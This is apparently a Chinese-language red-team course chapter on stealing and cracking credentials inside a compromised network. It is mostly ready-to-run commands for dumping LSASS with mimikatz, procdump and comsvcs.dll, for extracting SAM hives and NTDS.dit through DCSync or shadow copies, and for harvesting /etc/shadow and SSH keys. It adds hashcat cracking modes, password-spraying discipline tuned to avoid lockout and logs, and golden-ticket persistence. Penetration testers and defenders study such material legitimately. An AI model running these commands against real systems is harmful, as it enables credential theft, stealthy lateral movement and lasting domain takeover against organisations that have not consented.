# 凭据窃取与破解

## 1. 知识点讲解

内网推进的本质是「凭据经济学」：每一台机器都攒凭据，每一条凭据都可能开多扇门。顺序：本机明文凭据 → 哈希/票据 → 破解 → 喷洒复用 → 横向（05-03）。

## 2. Windows 凭据获取

### LSASS（内存明文凭据/哈希）
```bash
# 方法1：mimikatz（交互式，需管理员/SYSTEM）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# 方法2：procdump 转储后离线解析（过杀软，推荐）
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 本地：
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full"
# 方法3：comsvcs.dll（无第三方文件）
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full
# 方法4：LSA 保护（PPL）开启时：mimikatz 驱动 mimidrv / 或走 SAM、DPAPI 旁路
```

### SAM / SYSTEM / SECURITY（本地账户）
```bash
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM sys.hive & reg save HKLM\SECURITY sec.hive
secretsdump.py -sam sam.hive -system sys.hive -security sec.hive LOCAL   # 本地解
```

### 域控 NTDS.dit
```bash
# DCSync（首选，无落地）：secretsdump.py corp.local/admin@dc01 -just-dc
# 卷影拷贝（落地法）：
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\sys
secretsdump.py -ntds ntds.dit -system sys LOCAL
```

### 其他宝库
- DPAPI：浏览器/凭据管理器/WiFi 密码 → `mimikatz dpapi::`、SharpDPAPI。
- GPP cpassword：sysvol 里的 xml → `gpp-decrypt` 秒解。
- 配置文件：unattend.xml、web.config（数据库串）、sysprep.inf。

## 3. Linux 凭据获取

```bash
cat /etc/shadow                          # 需 root，unshadow + john
history; cat ~/.bash_history             # 命令行里的密码
grep -r "password" /etc /var/www /opt 2>/dev/null
cat ~/.ssh/id_rsa; cat ~/.my.cnf         # 私钥与数据库配置
# 内存：/proc/<pid>/maps + strings（mimi 系工具如 mimipenguin，成功率一般）
```

## 4. 破解（hashcat 为主）

```bash
# 模式速查
-m 1000 NTLM      -m 5600 NetNTLMv2     -m 13100 Kerberoast(TGS)   -m 18200 AS-REP
-m 500 md5crypt   -m 1800 sha512crypt   -m 16500 JWT               -m 22000 WiFi

hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule --force
hashcat -m 1000 ntlm.txt -a 3 ?a?a?a?a?a?a?a?a        # 掩码
# 定制字典：公司名+年份、泄露库同域密码（01-03）、cewl 爬官网生成
cewl -d 2 -m 5 https://target.com -w cewl.txt
```

原则：先快字典+规则（10 分钟），再掩码（按泄露密码模式定制），最后大字典慢磨。

## 5. 凭据复用策略（防锁死）

- 喷洒纪律：每账户 ≤2 次/时，全用户共享一个口令为一轮；`--continue-on-success` 继续扫后续目标。
- 锁定侦察：先查域策略 `Get-DomainPolicy`（PowerView）的 LockoutThreshold；未知时一律保守。
- 复用优先级：本地管理员哈希（撞全局镜像机）> 服务账户 > 个人域账户。
- 票据/哈希优先于明文：PTH 不产生登录失败日志，比明文喷洒安静。

## 6. 使用场景

| 场景 | 动作 |
| --- | --- |
| 拿下第一台 Windows 服务器 | procdump lsass → 解出域管理员历史登录 → 直接横向 |
| 只有普通域账户 | Kerberoast → 离线破服务账户弱口令 |
| 拿下一台 Linux | 翻 ssh key + 数据库配置 → 撞同网段机器 |
| 域控到手 | DCSync → krbtgt → 黄金票据长期持有 |
